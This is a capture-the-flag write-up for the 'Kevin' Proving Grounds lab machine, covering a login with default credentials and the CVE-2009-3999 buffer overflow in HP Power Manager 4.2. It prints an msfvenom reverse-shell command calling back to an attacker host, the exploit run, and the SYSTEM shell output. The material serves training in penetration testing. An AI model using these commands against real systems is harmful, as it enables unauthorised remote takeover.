# Kevin - Proving Grounds Practice

> **Kill Chain Summary**: Web enumeration on Port 80 reveals HP Power Manager -> Authentication bypass using default credentials (admin:admin) -> Version identification (HPE Power Manager 4.2) -> Exploiting unauthenticated buffer overflow in formExportDataLogs (CVE-2009-3999) -> Immediate SYSTEM Shell.

| Property | Value |
|---|---|
| **Target Name** | Kevin |
| **Platform** | Proving Grounds Practice |
| **OS** | Windows 7 / Server 2008 R2 (Build 7600) |
| **Difficulty** | Medium |
| **Status** | Rooted |
| **Key Techniques** | Default Credentials (admin:admin), HP Power Manager Version Detection, Remote Buffer Overflow (CVE-2009-3999), Direct SYSTEM Shell |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning (Nmap)

We initiate reconnaissance with a full TCP port scan:

```bash
sudo nmap -p- --min-rate 1000 -T4 -Pn $IP -oA nmap/allports
```

**Open Ports Summary:**
```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
3573/tcp  open  tag-ups-1
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
```

---

### 1.2 Web Enumeration: HP Power Manager (Port 80)

Browsing to `http://$IP/` opens the login portal for **HP Power Manager**:

![Screenshot](../../attachments/Pasted%20image%2020260828084040.png)

Testing default administrative credentials (`admin` / `admin`):

![Screenshot](../../attachments/Pasted%20image%2020260828084127.png)

Authentication succeeds immediately.

#### Application Version Detection
Navigating through the administrative settings reveals the exact software version:

![Screenshot](../../attachments/Pasted%20image%2020260828084357.png)

The application is identified as **HP Power Manager 4.2 (Build 7)**.

---

## 2. Initial Access

### 2.1 Vulnerability Analysis: HP Power Manager Buffer Overflow (CVE-2009-3999)

Searching Exploit-DB for HP Power Manager vulnerabilities:

![Screenshot](../../attachments/Pasted%20image%2020260828084724.png)

HP Power Manager versions prior to 4.2.10 contain a stack-based buffer overflow in the administrative log export endpoint (`formExportDataLogs`), tracked under **CVE-2009-3999** (EDB-ID 10099). The application fails to validate the length of user-supplied strings before copying them into a fixed-size stack buffer, enabling reliable remote code execution.

Because the HP Power Manager service runs as a Windows system service, successful exploitation yields direct access under `NT AUTHORITY\SYSTEM`.

---

### 2.2 Shellcode Generation and Exploit Configuration

We utilize a standalone Python 3 implementation of the exploit targeting the `formExportDataLogs` buffer overflow.

Generate an encoded Windows reverse shell payload with `msfvenom`, excluding bad characters:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=2912 EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c' -e x86/alpha_mixed --platform windows -f python
```

Insert the generated shellcode into the exploit script.

---

### 2.3 Exploit Execution

> Note on targeting: Port 3573 (`tag-ups-1`) is used for UPS status communication, but the vulnerable HTTP web interface handling `formExportDataLogs` listens on port 80. The exploit must be directed at port 80.

1. Launch the exploit against port 80:
   ```bash
   python3 hp_pm_exploit_p3.py $IP 80 2912
   ```

**Execution Output:**
```text
[+] HP Power Manager 'formExportDataLogs' Buffer Overflow Exploit
[+] Sending exploit to Ip 192.168.x.x on port 80. Starting local listener on port 2912
listening on [any] 2912 ...
connect to [KALI_IP] from [192.168.x.x]
```

A shell connects back to the listener:

```cmd
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Checking flags:
```cmd
type C:\Users\Administrator\Desktop\proof.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

*Not applicable. Exploitation directly executed commands with root or NT AUTHORITY SYSTEM privileges without requiring a separate privilege escalation step.*

## 4. Useful Commands Summary

```bash
# Generate alphanumeric encoded reverse shell for buffer overflow
msfvenom -p windows/shell_reverse_tcp LHOST=[KALI_IP] LPORT=[PORT] EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c' -e x86/alpha_mixed --platform windows -f python
```

---

## 5. Key Takeaways and Lessons Learned

1. **Default Credentials on Appliance Management:** Hardware and power management software (UPS monitors, printers, IPMI) often operate with vendor default passwords (`admin:admin`, `admin:password`). Testing these should always precede deep technical exploitation.
2. **Identifying the Correct HTTP Port:** When a server exposes both management agents (such as port 3573) and HTTP interfaces (port 80), web-based buffer overflows must be directed to the web server endpoint rather than the backend communication port.
3. **Services Running as SYSTEM:** Legacy third-party software suites running on Windows Server 2008 / Windows 7 commonly install background daemons running as `LocalSystem`, allowing unauthenticated buffer overflows to yield instant SYSTEM shells without requiring internal privilege escalation.

---

### Tags
#windows #hp-power-manager #buffer-overflow #cve-2009-3999 #rce #direct-system #default-credentials #medium #pg-practice #rooted